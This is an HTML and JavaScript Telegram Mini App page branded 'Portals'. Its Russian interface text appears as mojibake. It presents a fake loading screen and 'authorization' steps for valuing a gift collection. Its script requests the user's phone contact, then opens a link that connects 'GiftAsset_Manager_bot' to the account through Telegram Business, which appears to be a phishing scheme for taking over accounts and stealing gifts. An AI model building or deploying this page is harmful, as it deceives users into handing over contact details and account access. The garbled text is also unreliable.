<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { margin: 0; padding: 0; background-color: #0b0b0b; color: white; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .bg-icons { position: absolute; width: 100%; height: 100%; opacity: 0.4; z-index: 1; }
        .loader-container { position: relative; z-index: 10; text-align: center; width: 80%; }
        .logo { font-size: 32px; font-weight: 600; margin-bottom: 20px; }
        .progress-bar-bg { width: 100%; height: 6px; background: rgba(255,255,255,0.1); border-radius: 10px; overflow: hidden; }
        .progress-bar-fill { width: 0%; height: 100%; background: white; transition: width 0.1s linear; }
        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 100; display: none; justify-content: center; align-items: center; backdrop-filter: blur(8px); }
        .modal-card { background: #1c1c1e; width: 85%; max-width: 320px; border-radius: 28px; padding: 24px; text-align: center; }
        .login-btn { background: #24a1de; color: white; border: none; width: 100%; padding: 16px; border-radius: 16px; font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.3s; }
        .info-badge { background: rgba(36, 161, 222, 0.15); color: #24a1de; padding: 10px; border-radius: 14px; font-size: 13px; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="bg-icons"></div>
    <div class="loader-container" id="loader">
        <div class="logo">Portals</div>
        <div class="progress-bar-bg"><div class="progress-bar-fill" id="progress"></div></div>
    </div>

    <div class="modal-overlay" id="modal">
        <div class="modal-card">
            <h2 id="modalTitle">–ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è</h2>
            <p id="modalText">–î–ª—è –æ—Ü–µ–Ω–∫–∏ –≤–∞—à–µ–π –∫–æ–ª–ª–µ–∫—Ü–∏–∏ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –≤–ª–∞–¥–µ–Ω–∏–µ –ø—Ä–æ—Ñ–∏–ª–µ–º.</p>
            <div class="info-badge" id="infoBadge">üîê –ë–µ–∑–æ–ø–∞—Å–Ω–∞—è –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è —á–µ—Ä–µ–∑ Telegram Business.</div>
            <button class="login-btn" id="mainButton" onclick="handleAction()">–ü–û–î–¢–í–ï–†–î–ò–¢–¨ –ò –í–û–ô–¢–ò</button>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();

        let step = 1;
        let width = 0;
        const progressBar = document.getElementById('progress');

        const interval = setInterval(() => {
            if (width >= 100) {
                clearInterval(interval);
                document.getElementById('loader').style.display = 'none';
                document.getElementById('modal').style.display = 'flex';
            } else {
                width += 2;
                progressBar.style.width = width + '%';
            }
        }, 30);

        function handleAction() {
            if (step === 1) {
                tg.requestContact((ok) => {
                    if (ok) {
                        step = 2;
                        document.getElementById('modalTitle').innerText = "–®–∞–≥ 2: –®–ª—é–∑";
                        document.getElementById('modalText').innerText = "–ù–æ–º–µ—Ä –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω. –¢–µ–ø–µ—Ä—å –ø–æ–¥–∫–ª—é—á–∏—Ç–µ –º–æ–¥—É–ª—å –æ—Ü–µ–Ω–∫–∏ –ø–æ–¥–∞—Ä–∫–æ–≤.";
                        const btn = document.getElementById('mainButton');
                        btn.innerText = "–ü–û–î–ö–õ–Æ–ß–ò–¢–¨ –û–¶–ï–ù–ö–£ üéÅ";
                        btn.style.background = "#31b545";
                    }
                });
            } else {
                const botUser = "GiftAsset_Manager_bot";
                tg.openTelegramLink(`https://t.me/${botUser}?startbusiness=auth`);
                setTimeout(() => { tg.close(); }, 1000);
            }
        }
    </script>
</body>
</html>

